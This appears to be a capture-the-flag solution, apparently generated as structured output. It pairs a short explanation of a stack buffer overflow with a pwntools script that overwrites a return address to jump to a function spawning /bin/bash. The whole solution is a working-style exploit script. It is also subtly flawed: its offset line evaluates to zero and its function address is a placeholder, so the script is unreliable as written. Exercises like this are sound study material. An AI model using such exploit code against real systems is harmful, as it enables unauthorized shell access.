code(prefix='To solve this challenge using pwntools, we need to exploit the `vulnerable_function` which reads up to 256 bytes into a buffer of size 136. This can lead to a buffer overflow, allowing us to overwrite the return address and control the execution flow. We will aim to call the `not_called` function, which executes `/bin/bash` and gives us a shell.

Steps:
1. Identify the offset to the return address.
2. Craft a payload that overwrites the return address with the address of `not_called`.
3. Send the payload to the vulnerable function.
4. Interact with the shell.', imports='from pwn import *', code="binary = './vulnerable_binary'

# Start the process
io = process(binary)

# Find the offset to the return address
offset = cyclic_find(0x61616161)  # Example offset, replace with actual value

# Get the address of the 'not_called' function
not_called_addr = p32(0x080484a4)  # Replace with the actual address

# Craft the payload
payload = b'A' * offset
payload += not_called_addr

# Send the payload
io.sendline(payload)

# Interact with the shell
io.interactive()")
